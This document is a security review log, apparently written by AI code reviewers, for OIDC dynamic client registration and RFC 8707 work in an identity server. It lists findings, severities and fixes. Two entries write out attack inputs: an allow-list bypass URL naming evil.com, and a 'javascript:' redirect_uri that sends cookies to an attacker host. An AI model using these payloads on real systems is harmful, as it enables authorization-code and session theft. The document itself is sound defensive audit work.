---
created: "2026-04-24T13:30:00Z"
last_edited: "2026-04-27T00:00:00Z"
---
# Codex Peer Review — Tier 0 Findings

Build site: context/plans/build-site.md
Tier: 0
Base ref: cc74a36b6 (pre-tier-0 main HEAD)
Reviewer: Codex gpt-5-codex
Review date: 2026-04-24

## Findings

| ID | Severity | File | Line | Description | Status |
|----|----------|------|------|-------------|--------|
| F-001 | P1 | internal/api/oidc/token_exchange.go | 44 | T-004 removed the `resource`-parameter rejection from `/token` token-exchange but the remainder of RFC 8707 (audience plumbing via T-014/T-027/T-045, allow-list validation via T-026) has not landed yet. Today a request with `resource=...` succeeds and mints a token whose `aud` claim never reflects the supplied resource — this is worse than the prior explicit `invalid_target` rejection per RFC 8707 §2 (AS should return `invalid_target` when it cannot honor the resource). Either keep rejecting until T-026/T-027/T-045 land, or accelerate the propagation pipeline so there is never a gap. | RESOLVED-AUTHORIZE / OPEN-TOKEN |

## Resolution status (2026-04-26)

**/authorize path: CLOSED.** Tier 2 cluster T-026 + T-027 + T-028 (commits 3124fd94a, 2591cb012) shipped together as the F-001 closer per Option B. The /authorize sidecar now validates `resource` against `AllowedAudiences` and rejects out-of-list values with the RFC 8707 §2 `invalid_target` 400 envelope BEFORE the request reaches the auth-request creation path; in-list values are merged into `OIDCSession.Audience` and surface in the issued access-token `aud` claim.

**/token path: still open until T-045 (Tier 3).** The 6 token grant handlers (token_code, refresh, client_credentials, device, exchange, jwt_profile) do not yet call `ValidateResources` or `writeInvalidTargetError`; the helpers and the typed `IsInvalidTargetError` predicate are in place so T-045 is a one-liner per handler. Until T-045 lands, a /token request with `resource=...` still mints a token whose `aud` does not reflect the resource — same behavior as before the cluster, but now device-flow tokens DO get the merge because device-auth shares the `/authorize` sidecar pre-validation entry.

Recommend marking F-001 as RESOLVED only after T-045 + T-046 close /token coverage.

## Recommended remediation

Option A (revert + sequence): revert T-004 and land it together with T-026 at Tier 2 so the parameter is only accepted once the allow-list gate exists, then wire propagation at T-027/T-045.

Option B (accelerate): land T-026/T-027 (Tier 2) in the same tier cadence as T-004, i.e., bundle the gate + propagation so acceptance and enforcement ship together. T-045 (Tier 3) can follow separately since it only extends existing behavior to more grants.

Option C (interim gate): replace the removed rejection with a narrower interim rejection that (a) rejects syntactically invalid URIs with `invalid_target`, (b) accepts valid URIs but continues to omit them from `aud` until T-027 lands, and (c) ships a CHANGELOG / release-note warning flagging the interim gap.

Recommendation: **Option B** — bundling T-004 with T-026/T-027 into a single coherent change preserves RFC 8707 contract semantics at all tier boundaries. The build-site ordering that placed T-004 in Tier 0 and T-027 in Tier 2 introduces an unnecessary correctness gap across tier commits.

Decision owner: human (user). Waiting on direction before revert or bundling.

## Update (2026-04-24, post-T-013 code-ready)

T-013 (upstream `github.com/zitadel/oidc` PR) is now code-complete on
`../oidc` branch `feat/authrequest-resource-rfc8707`. Once that PR
merges and Zitadel bumps the dep past the merge SHA, `r.Data.Resource`
will be available on `AuthRequest` in the `/authorize` path, so T-014
can wire propagation directly — no sidecar needed. This adds a new
remediation option:

- **Option D (new)**: land the upstream PR first, bump the dep, then
  land T-014+T-026+T-027+T-045 in a single coherent PR that closes
  the F-001 window. T-004 stays as-is because the next-tier code path
  uses the accepted `resource` value. This is the cleanest outcome
  when the upstream merge has a short SLA.

Preferred path depends on upstream merge timeline. Short SLA →
Option D; long SLA → Option B (bundle T-004+T-026+T-027 in Tier 2
with the interim sidecar from T-012).

---

# /ck:check Findings — 2026-04-27 (Tier 0–3 mid-build review)

Build site: context/plans/build-site.md
Tier reviewed: 0–3 (38 of 86 tasks DONE)
Base ref: 3220f3d9a (pre-Tier-2 main)
Reviewer: ck:inspector (opus) + ck:surveyor (opus) + ck:verifier (opus)
Review date: 2026-04-27

## Findings

| ID | Severity | File | Line | Description | Status |
|----|----------|------|------|-------------|--------|
| F-100 | **P0** | internal/api/oidc/dcr/validate.go | 297-317 (extractHost) + 284-295 (matchesAnyHostPattern) | `AllowedRedirectURIHostPatterns` bypass via URL userinfo. extractHost cuts on `://`, `/`, `?`, `#` then splits port on `:` but never strips the RFC 3986 userinfo segment before `@`. URL `https://app.example.com:8080@evil.com/cb` parses to host=`app.example.com` and matches `*.example.com`; real host is `evil.com`. **Authorization-code exfiltration** — attacker registers a client with attacker-controlled DNS, defeats the host allow-list, steals codes via the malicious redirect. validate_test.go covers wildcards/IPv6/exact match but ZERO userinfo-bearing URLs. Reveals **kit gap** in cavekit-register-handler.md R4 — host-extraction algorithm unpinned. | RESOLVED 2026-04-27 (kit ae of cavekit-register-handler.md R4 + fix in dcr/validate.go: `net/url.Parse` + `u.Hostname()` + reject `u.User != nil`; 4 bypass shapes pinned by TestValidateAndClampMetadata_R4_UserinfoBypassRejected) |
| F-101 | **P0** | internal/api/oidc/dcr/auth.go | 178 (dummyPassWapHash) + internal/command/iat.go:328-343 (VerifyIATPlaintext) + cmd/defaults.yaml:984-998 | Anti-enumeration dummy hash defeats itself — **INVERTED timing oracle**. dummyPassWapHash hardcoded as `$argon2id$v=19$m=65536,t=2,p=1$...` but cmd/defaults.yaml ships `Algorithm: bcrypt` with empty `Verifiers` list. passwap.Swapper.Verify on `$argon2id$`-encoded string returns ErrNoVerifier immediately — zero crypto work. Real bcrypt-cost-4 verify takes ~5ms; dummy returns in microseconds. not-found / malformed / cross-instance paths now MEASURABLY FASTER than wrong-random — *inverted* oracle, **worse than no defence**. auth_test.go stubVerifier short-circuits on `encoded == s.matchHash` so unit tests never decode the dummy. Reveals **kit gap** in cavekit-iat.md R4 anti-enum AC — dummy hash is unspecified relative to the configured hasher. | RESOLVED 2026-04-27 (kit amendment splits AC into 3: provenance + startup probe + real-Passwap timing test; fix introduces `dcr.BuildAntiEnumDummyHash` + `dcr.RegistrationDeps` + `dcr.NewHandler` wiring scaffold; start.go now constructs deps from configured secretHasher with ErrNoVerifier panic probe; ResolveIAT signature takes dummy hash via parameter not package literal; F-102 dead-code closed by the wiring) |
| F-102 | P1 | internal/api/oidc/dcr/auth.go | 198-257 (ResolveIAT) | T-037 production path is dead code. `grep -rn "ResolveIAT\|ParseIATPlaintext"` finds zero non-test callers. T-040 dispatcher (consumer) still pending. Kit edit + tests claim "T-037 lands in full" but no production code reaches the function — F-101 cannot surface in any integration test because nothing reaches ResolveIAT. T-037 should be downgraded from DONE to PARTIAL until T-040 lands the wiring. F-101 fix (move dummy-hash construction to wiring site) addresses both. | RESOLVED 2026-04-27 (the F-101 fix landed `dcr.NewHandler(deps)` constructor wired from `cmd/start/start.go`; `BuildAntiEnumDummyHash(commands.SecretHasher())` now has a real production caller. T-040 will fill in the actual handler bodies that invoke ResolveIAT — the deps + scaffolding are ready) |
| F-103 | P1 | internal/api/oidc/dcr/validate.go:104 + internal/domain/application_oidc.go (rfc7591ResponseTypes) | response_types clamp is whitespace-order-sensitive. RFC 6749 §3.1.1 defines value as a **space-separated SET** — `"token id_token"` MUST equal `"id_token token"`. Clamp does exact `slices.Contains`; domain mapper switches on literal string. Spec-compliant clients sending `"token id_token"` get 400. Reveals kit gap in cavekit-register-handler.md R2 + R4 (response_types semantics not spec'd). | RESOLVED 2026-04-27 (kit AC adds canonicalization: tokens split on whitespace + sorted alphabetically + joined; mirrors zitadel/oidc/v3 canonical spelling so no inconsistency w/ existing OIDC stack. Fix adds `canonicaliseResponseType` + `intersectResponseTypes`; allow-list spelling preserved on output. 5 subtests P incl. non-canonical-vs-canonical, extra-whitespace, single-token, disallowed-rejected) |
| F-104 | P2 | internal/api/grpc/admin/iat.go:93-108 + internal/query/initial_access_tokens_search.sql | ListInitialAccessTokens lying API contract — proto declares ListQuery + ListDetails; impl ignores both. SQL has no LIMIT/OFFSET; ListDetails never populated. Trim proto or implement pagination. cavekit-iat.md R6 + impl drifted. | NEW |
| F-105 | P2 | apps/api/test-integration-api.yaml + context/impl/impl-config.md (T-048) | Anonymous-mode integration coverage silently deferred. T-048 sets `RequireInitialAccessToken=true`, gating AC4/AC5 anonymous resolution to unit-test only. No follow-up task tracks this. Add an integration-fixture variant with anonymous mode + DefaultProjectID/DefaultOrgID set via instance-feature commands. | NEW |
| F-106 | P3 | internal/query/projection/initial_access_token.go:170 + internal/query/initial_access_token.go:37 | consumed_slots SMALLINT[] silently overflows at use_index 32768 on finite=true tokens with very high max_uses. Document a kit-level cap on max_uses ≤ 32767, OR migrate column to INT[]. Inspector flagged this in Tier 2 review; restated. | OPEN |

## Verdict

**REJECT** — 2 P0 findings block forward progress. T-040 (RegisterClient keystone) MUST NOT land until F-100 + F-101 are routed through `/ck:revise --trace --from-finding F-100` / `F-101`. Both reveal kit gaps that need backprop, not just code fixes.

## Recommended next actions

1. **Route F-100 and F-101 through `/ck:revise --trace`** — both reveal kit gaps requiring user-approved kit amendments before code fixes. F-100 amends cavekit-register-handler.md R4 to pin the host-extraction algorithm (use net/url + reject userinfo). F-101 amends cavekit-iat.md R4 to require the dummy hash come from the same hasher instance + adds a startup probe AC.
2. **Bundle F-102 into F-101 fix** — moving dummy-hash construction to a wiring-site initialization call also gives ResolveIAT a real production caller as soon as T-040 ships.
3. **Defer F-103 / F-104 / F-105 / F-106** — log + revisit at next /ck:check boundary; not blocking.
4. **Downgrade T-037 status** — flip from DONE to PARTIAL in `context/impl/impl-register-handler.md` until T-040 wiring lands.


---

# /ck:check Findings — 2026-04-27 (Tier 3 close-out — second pass)

Build site: context/plans/build-site.md
Tier reviewed: 3 close-out (loop window 9e6f0435c..84c36d160 → 10 task commits + 1 wiring fix)
Base ref: 9e6f0435c (previous /ck:check REJECT verdict — F-100/F-101/F-102/F-103 all RESOLVED)
Reviewers: ck:verifier (opus) + ck:surveyor (opus) + ck:inspector (opus, code) + ck:inspector (opus, security audit). Codex skipped — wrappers absent in repo.
Review date: 2026-04-27

## Findings

| ID | Severity | Vector | File | Description | Status |
|----|----------|--------|------|-------------|--------|
| F-200 | **P0** | auth/anti-replay | internal/api/oidc/dcr/wire.go:285-323 + internal/command/dynamic_client_registration.go:97-99 + cmd/start/start.go:716-742 | **IAT slot is NEVER consumed.** `ResolveIAT` doc says caller MUST consume; `RegisterClient` doc says caller MUST have already consumed; the dispatcher doesn't; the start.go closure doesn't. `grep -rn ConsumeInitialAccessToken internal/api/oidc/ internal/command/dynamic_client_registration.go` returns ZERO call sites. Any valid IAT can be replayed unboundedly to register N clients regardless of MaxUses. The R2 race-safety harness, the per-slot UniqueConstraint, and the Errors.DCR.IAT.Exhausted error path are all dead code in production. | NEW |
| F-201 | **P0** | secret/persistence | internal/api/oidc/dcr/wire.go:186 + wire.go:329 + internal/api/oidc/dcr/response.go:177 + cmd/start/start.go:716-742 | **client_secret_expires_in dropped.** `RegisterResult` carries no `ClientSecretExpiresIn` field; dispatcher leaves `RegistrationOutput.ClientSecretExpiresIn` zero; `clientSecretExpiresAtFor` returns 0 ("no expiry" sentinel). `config.OIDC.DCR.ClientSecretExpiresIn` (op.go:74) is never threaded through. Every issued client_secret advertises "never expires" regardless of policy. | NEW |
| F-217 | **P0** | auth/tenancy | cmd/start/start.go:744 | **DCR handler mounted WITHOUT instanceInterceptor + WITHOUT limitingAccessInterceptor.** Compare to login/idp/saml mounts which wrap both. `authz.GetInstance(ctx)` returns `emptyInstance` → `featureGateMiddleware` reads `emptyInstance.Features().DynamicClientRegistration` (always false) so endpoint is unreachable in default config; if any host-routing layer side-steps this, anonymous DCR registrations persist with `instance_id=""` (cross-tenant). No rate limit on what is by design an unauthenticated, write-amplifying endpoint. | NEW |
| F-203 | **P0** | rfc8707/refresh | internal/api/oidc/token_refresh.go:29-37 + internal/api/oidc/rfc8707_token.go:60-63 | **v2 refresh-token path skips RFC 8707 §2.2 narrowing.** Only `refreshTokenV1` (line 59) calls `narrowAudienceByTokenResources`. The primary `RefreshToken` (line 29) calls `ExchangeOIDCSessionRefreshAndAccessToken` and never reads `ResourcesFromContext`. v2 refresh requests with `resource=...` either silently broaden or silently ignore. F-001 `/token` closure only complete for V1. | NEW |
| F-218 | **P1** | redir/XSS | internal/domain/application_oidc.go:300-308,340-349 (consumed at internal/api/oidc/dcr/validate.go:267) | **`javascript:` / `data:` / `file:` redirect_uris accepted for `application_type=native`.** Compliance code only special-cases http/https; any other scheme falls into `containsCustom` and is allowed. Combined with `isLoopbackHTTP` short-circuit, custom-scheme URIs bypass `AllowedRedirectURIHostPatterns`. A registered client with `redirect_uris=["javascript:fetch('https://attacker/?'+document.cookie)"]` and `application_type=native` is persisted; any /authorize flow against that client_id delivers XSS through the user-agent. | NEW |
| F-202 | P1 | info-leak/header | internal/api/oidc/dcr/wire.go:346-353 | `writeDispatchError` falls back to `WriteError(w, 500, ErrCodeInvalidClientMetadata, err.Error())`. DB / eventstore push errors leak zerror IDs (COMMA-..., DCR-RC005), wrapped error chains, possibly SQL state to unauthenticated callers. Wrong envelope code too (DB failure ≠ invalid_client_metadata). | NEW |
| F-219 | P1 | sidechannel/auth-order | internal/api/oidc/dcr/wire.go:277-296 | **Decode runs BEFORE auth.** With `RequireInitialAccessToken=true`, an anonymous attacker probes 413/415/400 + JSON-parse fingerprint without ever being challenged for Bearer. The 401 only fires after decode succeeds. Endpoint becomes a free fingerprint surface. R3 implies "401 first when IAT required". | NEW |
| F-204 | P1 | dos/config | internal/api/oidc/dcr/decode.go:99-102 | `MaxBodyBytes==0` from yaml is silently rewritten to 64 KiB, not "unlimited". An admin who explicitly sets MaxRequestBodyBytes=0 (intending no cap) gets the default fallback. No way to disable. `software_statement` JWTs may legitimately exceed 64 KiB. | NEW |
| F-205 | P1 | test-integrity | internal/query/projection/dcr_rollback_test.go:46 | **The "compile-time" size-anchor does NOT detect drift.** `var _ = unsafe.Sizeof(initColumnMirror{}) - unsafe.Sizeof(handler.InitColumn{})` evaluates to a uintptr; subtraction compiles cleanly under any size delta. Mirror could silently misread `nullable` as `defaultValue` if upstream struct grows by a field. | NEW |
| F-206 | P2 | audit-completeness | cmd/start/start.go:716-742 + internal/command/dynamic_client_registration.go:54 | `SoftwareStatementJTI` field exists in `RegisterClientInput` and the audit event but is never populated end-to-end. Phase 2 software_statement work will record empty JTI. Dead code today. | NEW |
| F-207 | P2 | privacy/audit | internal/command/dynamic_client_registration.go:246-253 | **Salt-less SHA-256 of an IPv4 address is brute-forceable** (~2³² keys, minutes on a laptop). Doc says "privacy" but the field is recoverable. HMAC with audit key OR truncate to /24 before hash. | NEW |
| F-208 | P2 | auth/integrity | internal/command/dynamic_client_registration.go:103-152 | `RegisterClient` performs no project-existence check. Anonymous DCR with `DefaultProjectID="non-existent"` pushes 4 events onto an aggregate with no `ProjectAddedEvent` ancestor; projection silently drops the row, eventstore retains orphans. | NEW |
| F-209 | P2 | auth/header | internal/api/oidc/dcr/wire.go:358-366 | `writeAuthError` only sets `WWW-Authenticate` for ClampError with code `invalid_token`; non-ClampError 401 paths fall through to writeDispatchError → 500 + leaked err.Error(). | NEW |
| F-210 | P2 | dos/storage | internal/repository/project/dynamic_client_registration.go:35,37 | Attacker-controlled `ClientNameUnclamped` (up to 64 KiB) and `UserAgent` (HTTP-header-sized, unbounded by stdlib) persisted to eventstore without length cap or sanitization. Log-injection via control chars also possible. | NEW |
| F-211 | P2 | test-integrity | internal/api/oidc/integration_test/rfc8707_resource_test.go:165-176 | Opaque-token fall-through: `if len(parts) != 3 { return nil }` — assertion `Contains(nil, resource1)` fails the test on Zitadel default (opaque tokens), not skips. Test breaks the integration suite. | NEW |
| F-212 | P2 | rfc8707/contract | internal/api/oidc/rfc8707_token.go:60-63 | Empty-intersection guard returns ORIGINAL audience. Per RFC 8707 §2.2 the right answer is `invalid_target` 400 — current behaviour issues a token whose audience differs from what client requested. Sidecar rejects upstream (allowed-list pre-check) but if AllowedAudiences is empty (sentinel: unrestricted), this fires. | NEW |
| F-220 | P2 | dos/auth | internal/api/oidc/dcr/decode.go:103 | `http.MaxBytesReader(nil, r.Body, max)` — first arg should be `http.ResponseWriter` so `Connection: close` fires on overflow. Pipelined attacker keeps connection alive after 413, costs accept-loop time. No rate-limit (see F-217). | NEW |
| F-221 | P2 | auth/parsing | internal/api/oidc/dcr/auth.go:65-74 | `"Bearer\tfoo"` (tab separator per RFC 9110 §11.4) treated as `AuthModeAnonymous` instead of IAT. Misconfigured proxy that uses tab handles a valid IAT to anonymous code path. `Bearer foo bar` keeps internal whitespace in tok. | NEW |
| F-222 | P2 | privacy/header | internal/api/oidc/dcr/wire.go:317 + internal/api/http/header.go:107 | UA + RemoteIPStringFromRequest plumbed un-sanitised. UA un-truncated (control chars + 8KB strings persisted). `RemoteIPStringFromRequest` honours XFF — without trusted-proxy whitelist (and DCR has no instance interceptor per F-217), source IP is spoofable. | NEW |
| F-213 | P3 | quality | internal/api/oidc/dcr/wire.go:368-375 | Dead-code anchor `var _ = func() bool { ... }()` runs at init time uselessly. | NEW |
| F-214 | P3 | testing/coverage | internal/api/oidc/dcr/decode.go:139-143 | "drop client_name#&lt;lang&gt;" comment lacks regression test. | NEW |
| F-215 | P3 | drift-risk | internal/api/oidc/dcr/wire.go:152-159 | Duplicated string consts (`RegMethodAnonymous`/`IAT`) mirror `command.RegistrationMethod*` — drift risk for future enum additions. | NEW |
| F-216 | P3 | observability | internal/api/oidc/dcr/response.go:127 + wire.go:337 | `_ = WriteRegistrationResponse(...)` discards encode error. Partial write means client never sees RAT, events committed, client unusable. | NEW |
| F-223 | P3 | crypto/startup | internal/api/oidc/dcr/wire.go:69-78 | `BuildAntiEnumDummyHash` probe panics only if Verify returns ErrNoVerifier; if a future hasher returns nil error for any input, probe silently accepts. Use TWO different wrong plaintexts. | NEW |
| F-224 | P3 | auth/feature | internal/api/oidc/dcr/handler.go:91 | `featureGateMiddleware` only checks runtime feature flag, not yaml-gate. If yaml gate were ever bypassed, runtime flag becomes single point of control. Defence-in-depth: also consult yaml flag. | NEW |
| F-225 | P3 | csrf | cmd/start/start.go:744 | DCR endpoint has no CORS wrapper — JSON CSRF is naturally blocked by preflight requirement. Anonymous mode means `text/plain` simple-CORS still consumes quota / spans. Document the assumption. | NEW |
| F-226 | P3 | clamp/contract | internal/api/oidc/dcr/validate.go:354-368 | `intersectStringSlice` empty-intersection semantics is comment-only (`// empty allow-list = deny all`). Fragile — make it a typed `(result []string, ok bool)` so future callers can't misread it (would have caught F-212 shape). | NEW |

## Verifier verdict (goal-backward AC check)
**APPROVE** — 51 / 56 ACs MET, 4 PARTIAL (sanctioned deferrals), 1 UNVERIFIABLE (R3 AC4 wording mismatch — semantically equivalent). T-046 flagged as "falsely complete" — strict reading of R5 AC7 ("integration test exercises EACH handler") is PARTIAL when only client_credentials is exercised end-to-end.

## Coverage (Tier 0–3)
- 24 in-scope requirements: 17 COMPLETE / 7 PARTIAL (all sanctioned deferrals to Tier 4-6 doc/integration tasks)
- All 49 Tier 0–3 tasks marked DONE in loop log
- No OVER-BUILT findings

## Verdict

**REJECT** — 4 P0 + 5 P1 findings. Three of the P0s are foundational:
1. **F-200** breaks the central anti-replay invariant of the entire IAT system. Every piece of race-safety work in T-017/T-018 + the per-slot UniqueConstraint mechanism is dead code in production because no one calls `ConsumeInitialAccessToken`.
2. **F-217** mounts the DCR handler without `instanceInterceptor` and without `limitingAccessInterceptor`. Either the endpoint is unreachable (default config — `authz.GetInstance` returns emptyInstance, runtime flag always false) OR if any deployment side-steps the gate, anonymous DCR persists with `instance_id=""` (cross-tenant write). No rate limit on a write-amplifying endpoint.
3. **F-201** + **F-203** are functional regressions on configured fields (client_secret_expires_in always 0; v2 refresh skips RFC 8707 §2.2 narrowing). Both are "wired up but the wire goes nowhere".
4. **F-218** turns DCR into an XSS-distribution channel for any deployment allowing `application_type=native` (the default).

The Tier 3 work shipped with passing tests and clean kits because the test scaffolding never exercised the production-wired `cmd/start/start.go` path end-to-end. The verifier confirms the building blocks individually MET their kit ACs; the inspector + security audit found the assembly is broken.

## Kit gaps revealed (candidates for /ck:revise --trace)

- **F-200** reveals a kit gap: cavekit-register-handler.md R6 + cavekit-iat.md R2 do not pin "the dispatcher MUST consume an IAT slot before commit." This is the same shape as F-101 — kit AC is described in plain English ("consume one use") but the dispatcher contract is unspecified.
- **F-217** reveals a kit gap: no requirement specifies that DCR mounts MUST inherit `instanceInterceptor` + `limitingAccessInterceptor`. cavekit-config.md R3 just says "dual-gate". Add an R: "Mount middleware: DCR handlers MUST be mounted via the same interceptor stack as /oidc/v1/userinfo (instance + rate-limit + access-log + activity)."
- **F-218** reveals a kit gap: cavekit-register-handler.md R4 redirect_uri ACs do not pin a scheme allow-list. After F-100 (host parser bypass) this is the SECOND redirect_uri-related kit gap in the same loop window.
- **F-219** (auth-then-decode order) reveals a kit ambiguity: R3 implies 401 first but does not pin sequencing. The dispatcher invented an order without it being specified.

## Recommended next actions

1. **Block on F-200, F-201, F-217, F-203, F-218** — these MUST land before any Tier 4 work. Route through `/ck:revise --trace --from-finding F-XXX` for each (kit amendments precede code fixes per the post-DE-001 protocol).
2. **F-202, F-204, F-205, F-219** — fix in same batch; these are all dispatcher / decode hardening.
3. **Defer F-206..F-216, F-220..F-226** — log + revisit at Tier 4 boundary; not blocking but should be addressed before Phase 2.
4. **Downgrade T-040 + T-043 status** — flip from DONE to PARTIAL until F-200 + F-201 fixes land. The dispatcher composition is correct (verifier approved) but the production wiring is incomplete.
